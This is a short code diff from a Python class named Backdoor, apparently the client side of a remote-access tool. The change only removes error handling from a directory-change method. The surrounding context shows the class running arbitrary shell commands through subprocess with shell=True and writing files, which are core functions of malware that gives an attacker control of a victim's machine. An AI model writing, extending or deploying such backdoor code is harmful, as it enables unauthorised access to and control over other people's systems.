@@ -33,11 +33,8 @@ class Backdoor:
         return subprocess.check_output(command, shell=True)
 
     def change_working_directory_to(self, path):  # str -> str
-        try:
-            os.chdir(path)
-            return f'[+] Changing working directory to {path}'
-        except FileNotFoundError:
-            return f'[-] Path {path} not found'
+        os.chdir(path)
+        return f'[+] Changing working directory to {path}'
 
     def write_file(self, path, content):
         with open(path, 'wb') as file:
